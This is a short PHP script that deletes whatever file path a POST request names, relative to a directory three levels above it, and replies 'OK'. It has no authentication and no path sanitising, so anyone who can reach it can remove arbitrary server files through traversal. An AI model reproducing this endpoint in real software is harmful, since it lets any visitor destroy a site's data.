<?php 
    if(!empty($_POST['path'])) { 
        $path = dirname( dirname( dirname(__FILE__) ) ) . "/" . $_POST['path'];
        unlink($path);

        echo "OK";
    }
?>